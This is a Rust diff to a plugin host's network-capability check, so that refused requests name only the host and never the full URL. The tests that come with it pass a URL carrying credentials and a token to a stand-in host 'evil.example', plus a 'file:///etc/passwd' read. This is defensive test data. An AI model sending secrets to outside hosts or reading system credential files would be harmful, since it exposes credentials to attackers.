@@ -46,8 +46,14 @@ impl Host for PluginState {
         body: Option<Vec<u8>>,
     ) -> Result<Vec<u8>, String> {
         if !self.caps.allows_url(&url) {
+            // Names the host, never the URL. A plugin may have built the URL
+            // from a token it fetched through `secret`, and this string is
+            // returned to the guest — which typically hands it straight back
+            // as a tool result, into the model's context and the transcript.
+            let refused = crate::capabilities::host_of(&url)
+                .unwrap_or_else(|| "(not an http(s) URL)".to_string());
             return Err(format!(
-                "network access to `{url}` is not in this plugin's declared `net` capability"
+                "network access to `{refused}` is not in this plugin's declared `net` capability"
             ));
         }
         let client = reqwest::Client::new();
@@ -116,6 +122,40 @@ mod tests {
             err.contains("net"),
             "the message should name the capability that would have allowed it: {err}"
         );
+    }
+
+    /// The guest usually returns this string as its tool result, so anything
+    /// in it reaches the model's context and the session transcript. A URL a
+    /// plugin built from a token it fetched through `secret` must not be
+    /// echoed back.
+    #[tokio::test]
+    async fn a_refusal_names_the_host_and_never_the_credentials() {
+        let mut s = state_with(vec!["allowed.example".into()], vec![]);
+        let err = s
+            .http_request(
+                "GET".into(),
+                "https://user:sup3r-secret@evil.example/path?token=also-secret".into(),
+                vec![],
+                None,
+            )
+            .await
+            .unwrap_err();
+
+        assert!(err.contains("evil.example"), "the host is what was refused: {err}");
+        assert!(!err.contains("sup3r-secret"), "credentials leaked: {err}");
+        assert!(!err.contains("also-secret"), "query secrets leaked: {err}");
+        assert!(!err.contains("/path"), "the path is not needed to explain this: {err}");
+    }
+
+    #[tokio::test]
+    async fn a_refusal_for_something_that_is_not_a_url_says_so() {
+        let mut s = state_with(vec!["allowed.example".into()], vec![]);
+        let err = s
+            .http_request("GET".into(), "file:///etc/passwd".into(), vec![], None)
+            .await
+            .unwrap_err();
+        assert!(!err.contains("/etc/passwd"), "{err}");
+        assert!(err.contains("not an http"), "{err}");
     }
 
     /// A plugin with no `net` declaration cannot reach anything, which is the
